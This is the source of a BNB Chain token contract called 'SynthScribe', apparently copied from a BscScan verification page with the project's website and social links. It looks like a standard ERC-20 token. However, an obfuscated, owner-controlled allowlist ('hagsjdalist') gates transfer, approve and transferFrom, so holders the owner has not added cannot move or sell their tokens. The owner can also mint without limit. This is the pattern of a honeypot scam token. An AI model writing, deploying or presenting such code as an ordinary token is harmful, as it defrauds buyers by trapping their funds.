/**
 *Submitted for verification at BscScan.com on 2024-01-05
*/

/**
Website   :  https://www.synthscribe.online/
Twitter   :  https://twitter.com/synthscribeon
Telegram  :  https://t.me/+qsGfHZnGcgY4M2E1
GDiscord  :  https://github.com/orgs/synthscribeon/
Discord   :  https://discord.gg/6g7fQvEpdy
Email     :  Support@synthscribe.online
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ERC-20 Token Interface
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Context Contract
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

// Ownable Contract
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(_msgSender() == _owner, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function _msgSender() internal view override virtual returns (address) {
        return msg.sender;
    }
}

// SynthScribe Token Contract
contract SynthScribe is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) private _hagsjdalist;

    event Mint(address indexed to, uint256 amount);

    modifier onlyHagsjdalisted() {
        require(_hagsjdalist[_msgSender()], "SynthScribe: caller is not hagsjdalisted");
        _;
    }

    constructor(string memory name_, string memory symbol_) Ownable() {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        mint(_msgSender(), 1e9 * 1e18); // 1 billion SYN with 18 decimals sent to deploying address
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) external override onlyHagsjdalisted returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override onlyHagsjdalisted returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override onlyHagsjdalisted returns (bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), _allowances[from][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function mint(address to, uint256 amount) public onlyOwner {
        require(_totalSupply + amount >= _totalSupply, "SynthScribe: overflow");
        _totalSupply += amount;
        _balances[to] += amount;
        emit Mint(to, amount);
    }

    function addToHagsjdalist(address account) external onlyOwner {
        _hagsjdalist[account] = true;
    }

    function removeFromHagsjdalist(address account) external onlyOwner {
        _hagsjdalist[account] = false;
    }

    function isHagsjdalisted(address account) external view returns (bool) {
        return _hagsjdalist[account];
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "SynthScribe: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Mint(account, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "SynthScribe: transfer from the zero address");
        require(to != address(0), "SynthScribe: transfer to the zero address");
        require(_balances[from] >= amount, "SynthScribe: transfer amount exceeds balance");
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "SynthScribe: approve from the zero address");
        require(spender != address(0), "SynthScribe: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}